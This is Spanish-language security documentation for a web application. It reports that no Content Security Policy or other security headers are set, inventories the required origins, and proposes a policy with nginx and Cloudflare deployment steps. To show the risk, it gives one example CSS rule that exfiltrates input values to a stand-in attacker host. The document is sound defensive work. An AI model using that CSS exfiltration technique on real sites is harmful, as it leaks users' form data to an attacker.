# Content Security Policy

## Estado actual: no existe

Verificado en las tres capas donde podría definirse:

| Capa | Archivo | CSP |
| --- | --- | --- |
| HTML | `index.html` | ❌ Sin `<meta http-equiv="Content-Security-Policy">` |
| nginx | `docker/nginx.conf` | ❌ Sin `add_header Content-Security-Policy` |
| Cloudflare Worker | `wrangler.jsonc` | ❌ Solo declara `assets.directory`; sin cabeceras |

Tampoco existe ninguna otra cabecera de seguridad:

| Cabecera | Estado | Qué previene |
| --- | --- | --- |
| `Content-Security-Policy` | ❌ | Inyección de scripts y estilos, exfiltración |
| `X-Frame-Options` / `frame-ancestors` | ❌ | Clickjacking |
| `Strict-Transport-Security` | ❌ | Degradación a HTTP |
| `X-Content-Type-Options: nosniff` | ❌ | Confusión de tipo MIME |
| `Referrer-Policy` | ❌ | Fuga de URL en el `Referer` |
| `Permissions-Policy` | ❌ | Acceso a cámara, micrófono, geolocalización |

## Por qué importa aquí en concreto

La aplicación carga **CSS de un tercero sin verificación de integridad** (`cdnjs.cloudflare.com`, `index.html:14`). Sin CSP no hay una segunda barrera: si ese recurso se compromete, el CSS entra sin restricciones.

CSS malicioso puede exfiltrar datos sin JavaScript, mediante selectores de atributo:

```css
input[value^="a"] { background-image: url("https://atacante/?c=a"); }
```

Sobre un formulario de login o de datos personales, eso es filtración real.

## Inventario de orígenes que la aplicación necesita

Derivado del código; es la base para construir la política.

| Directiva | Orígenes requeridos | Evidencia |
| --- | --- | --- |
| `default-src` | `'self'` | — |
| `script-src` | `'self'` | Todo el JS es del propio bundle. **No hay scripts en línea ni de terceros** |
| `style-src` | `'self'`, `https://cdnjs.cloudflare.com`, `'unsafe-inline'` | CSS Modules + CDN de FontAwesome. `'unsafe-inline'` es necesario porque React inyecta estilos en línea en algunos casos y `driver.js` los usa para posicionar el globo |
| `font-src` | `'self'`, `https://cdnjs.cloudflare.com` | FontAwesome sirve sus fuentes desde el mismo CDN |
| `img-src` | `'self'`, `data:`, `https://res.cloudinary.com` | Logo local, previsualizaciones y archivos de Cloudinary |
| `connect-src` | `'self'`, el origen de `VITE_API_BASE_URL`, `https://api.cloudinary.com` | `httpClient` y `cloudinaryUpload` |
| `frame-ancestors` | `'none'` | La aplicación nunca debe embeberse |
| `form-action` | `'self'` | No hay envíos de formulario nativos a otros orígenes |
| `base-uri` | `'self'` | — |
| `object-src` | `'none'` | Sin `<object>` ni `<embed>` |

## Política propuesta

> ⚠️ **No aplicada.** Cambiar la configuración de servicio puede romper cargas legítimas. Requiere autorización y verificación previa en un entorno de prueba, primero en modo `Report-Only`.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
  font-src 'self' https://cdnjs.cloudflare.com;
  img-src 'self' data: https://res.cloudinary.com;
  connect-src 'self' https://<host-del-backend> https://api.cloudinary.com;
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  object-src 'none';
  upgrade-insecure-requests
```

`<host-del-backend>` debe sustituirse por el valor real de `VITE_API_BASE_URL` de cada entorno. **Como la CSP se define en la capa de servicio y la URL del API se fija en tiempo de build, ambos valores deben mantenerse sincronizados manualmente.** Es un riesgo operativo a registrar en [../operations/configuration.md](../operations/configuration.md).

### Cómo eliminar `'unsafe-inline'`

Si se retira el CDN de FontAwesome (usando solo los paquetes npm ya instalados), `style-src` se reduce a `'self' 'unsafe-inline'`. Eliminar además `'unsafe-inline'` requeriría auditar los estilos en línea que inyectan React y `driver.js`, y probablemente usar `nonce`, lo que exige generación dinámica de HTML — **incompatible con el alojamiento estático actual**.

Conclusión realista: `'unsafe-inline'` en `style-src` es aceptable; en `script-src` no es necesario y **no debe añadirse**.

## Procedimiento de adopción propuesto

1. **Modo informe.** Desplegar con `Content-Security-Policy-Report-Only` y una directiva `report-uri`/`report-to`. Como no hay servicio de recogida de informes, en la práctica se observa la consola del navegador.
2. **Recorrido completo.** Ejercitar las 10 rutas, un formulario CRUD, una subida de archivo y un tutorial guiado (`driver.js` es el consumidor más probable de estilos en línea).
3. **Ajustar** la política con las violaciones legítimas encontradas.
4. **Aplicar en modo bloqueo** primero en un entorno de prueba, luego en producción.
5. **Verificar** que ninguna pantalla queda rota: iconos, imágenes de Cloudinary, peticiones al backend y recorridos guiados.

## Dónde aplicarla

### nginx

```nginx
# docker/nginx.conf, dentro de server { }
add_header Content-Security-Policy "…" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

> Cuidado: `add_header` en nginx **no se hereda** en un `location` que defina sus propios `add_header`. `docker/nginx.conf` los tiene en `location /assets/` y en `location = /index.html`, así que habría que repetir las cabeceras o reorganizar el archivo. Es la razón principal por la que este cambio necesita verificación real y no es una edición trivial.

### Cloudflare Workers

El despliegue actual no ejecuta código de Worker (solo sirve assets). Opciones:

| Opción | Coste | Efecto |
| --- | --- | --- |
| Archivo `_headers` en `dist/` | Bajo | Cloudflare Pages lo soporta; **verificar si aplica a Workers con assets** |
| Regla de transformación de cabeceras en el panel de Cloudflare | Bajo | Fuera del repositorio: hay que documentarlo para que no se pierda |
| Worker con código que envuelva los assets | Alto | Cambia la arquitectura de despliegue |

La opción de la regla en el panel es la más rápida, pero introduce **configuración fuera del control de versiones**. Debe registrarse en [../operations/configuration.md](../operations/configuration.md) si se elige.

## Verificación tras aplicar

```bash
curl -I https://<dominio> | grep -i "content-security-policy\|x-frame-options"
```

Y en el navegador: consola sin violaciones de CSP tras recorrer las 10 rutas.
